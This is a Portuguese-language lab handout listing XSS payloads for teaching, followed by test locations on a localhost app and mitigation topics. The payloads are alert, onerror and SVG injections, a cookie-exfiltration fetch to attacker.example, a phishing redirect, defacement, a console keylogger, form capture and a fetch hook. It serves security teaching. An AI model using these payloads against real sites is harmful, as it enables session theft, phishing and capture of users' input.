# Payloads XSS para Demonstração Educacional

> Use apenas em ambiente de laboratório controlado.

## 1) Payloads básicos

### 1. Alert simples
```html
<script>alert('XSS básico')</script>
```
**O que faz:** exibe um popup simples, comprovando execução de JavaScript.

### 2. Injeção via imagem com erro
```html
<img src="x" onerror="alert('XSS via onerror')">
```
**O que faz:** executa JS no evento `onerror` da imagem quebrada.

### 3. SVG com onload
```html
<svg onload="alert('XSS via SVG')"></svg>
```
**O que faz:** executa JS ao carregar o elemento SVG.

---

## 2) Payloads intermediários

### 4. Exfiltração de cookie (simulação)
```html
<script>
  fetch('https://attacker.example/steal?c=' + encodeURIComponent(document.cookie))
</script>
```
**O que faz:** tenta enviar cookies para servidor externo (didático).

### 5. Redirecionamento malicioso
```html
<script>
  window.location = 'https://example.com/phishing';
</script>
```
**O que faz:** redireciona o usuário para página arbitrária.

### 6. Defacement de conteúdo
```html
<script>
  document.body.innerHTML = '<h1>Site comprometido</h1><p>Mensagem alterada por XSS</p>'
</script>
```
**O que faz:** altera visualmente toda a página.

---

## 3) Payloads avançados (laboratório)

### 7. Keylogger simples (conceitual)
```html
<script>
  document.addEventListener('keydown', (e) => {
    console.log('Tecla:', e.key);
  });
</script>
```
**O que faz:** captura teclas digitadas (aqui apenas no console).

### 8. Captura de formulário
```html
<script>
  const form = document.querySelector('form');
  if (form) {
    form.addEventListener('submit', (e) => {
      const data = new FormData(form);
      const out = Object.fromEntries(data.entries());
      console.log('Dados capturados:', out);
    });
  }
</script>
```
**O que faz:** intercepta dados submetidos em formulário.

### 9. Hook de requisições fetch
```html
<script>
  const originalFetch = window.fetch;
  window.fetch = async (...args) => {
    console.log('Interceptado fetch:', args);
    return originalFetch(...args);
  };
</script>
```
**O que faz:** intercepta chamadas `fetch` realizadas pela página.

---

## Onde testar cada tipo

- **Stored XSS:** enviar payloads no campo de comentário (`/`)
- **Reflected XSS:** colocar payload em `q` na URL (`/search?q=...`)

Exemplo:

```text
http://localhost:5003/search?q=<img src=x onerror=alert('Reflected')>
```

---

## Recomendações para discussão acadêmica

- Por que `innerHTML` é perigoso?
- Diferença entre Stored, Reflected e DOM XSS
- Mitigações:
  - escape/contextual encoding de saída
  - sanitização de HTML (quando necessário)
  - Content Security Policy (CSP)
  - cookies `HttpOnly`, `Secure`, `SameSite`
  - validação e normalização de entradas
